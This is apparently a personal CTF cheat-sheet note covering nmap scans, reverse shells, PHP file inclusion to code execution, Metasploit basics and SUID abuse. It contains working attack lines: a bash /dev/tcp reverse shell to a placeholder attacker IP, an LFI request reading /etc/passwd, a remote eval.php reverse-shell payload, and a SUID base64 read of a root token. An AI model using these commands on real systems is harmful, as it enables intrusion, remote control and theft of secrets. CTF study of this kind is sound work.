tags: #linux #security #ctf

# CTF

links: [[400 Security MOC|Security MOC]] - [[000 Index|Index]]

---
## nmap

- `-p0-`: scan every possible TCP port
- `-v`: verbose
- `-A`: enables aggressive tests such as remote OS detection, service detection and Nmap Scripting Engine (NSE)
- `-T4`: more aggressive timing policy to speed up the scan

```bash
nmap -p0- -v -A -T4 scanme.nmap.org
```

## reverse shell

See https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell

```bash
# start on attacker host
nc -nvlp 443

# exec on target server (e.g. bei code injection)
"/bin/bash -c 'bash -i >& /dev/tcp/${ATTACKING IP}/443 0>&1'
```

## via php vulnerability

- filesystem access via php: e.g. `http://${TARGET_IP}/test.php?page=/etc/passwd` -> access to file
- evt. lfi to rce: https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet
- expose `eval.php` file on localhost
- run reverse shell `http://${TARGET_IP}/test.php?page=http://${ATTACKER_IP}/eval.php`

```bash
# start to serve eval.php
python3 -m http.server 80

# start for reverse shell
nc -nvlp 444
```

- `eval.php` (replace ip)

```php
<?php
system('/bin/bash -c "bash -i >& /dev/tcp/${ATTACKER_IP}/444 0>&1"')
?>
```

## Metasploit

```bash
# start metasploit framework
msfconsole

# search for exploits
search java_rmi

# use exploit/auxiliary
use exploit/.../...

# show payloads
show payloads

# get options
get options

# set option
set RHOSTS 10.10.10.10

# execute
run or exploit
```

## SUID

```bash
# Find binaries with SUID Bit set
find / -perm -u=s -type f 2>/dev/null

# Use Base64 to get the token
./base64 /root/token.txt | base64 --decode
```

---
links: [[400 Security MOC|Security MOC]] - [[000 Index|Index]]